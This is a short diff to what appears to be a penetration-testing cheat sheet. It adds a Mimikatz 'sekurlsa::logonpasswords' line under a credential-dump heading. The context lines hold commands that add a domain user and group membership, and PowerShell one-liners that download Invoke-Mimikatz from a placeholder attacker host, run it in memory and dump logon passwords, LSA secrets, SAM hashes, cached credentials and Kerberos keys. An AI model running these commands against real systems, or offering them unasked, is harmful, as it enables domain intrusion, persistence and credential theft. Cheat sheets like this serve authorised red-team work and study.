@@ -680,6 +680,7 @@ net user {USERNAME} {PASSWORD} /add /domain
 net group "{GROUP}" {USERNAME} /add
 
 # MimiKatz Cred Dump
+sekurlsa::logonpasswords
 IEX (New-Object System.Net.Webclient).DownloadString("http://{IP ADDRESS}/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -DumpCreds 
 IEX (New-Object System.Net.Webclient).DownloadString("http://{IP ADDRESS}/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 
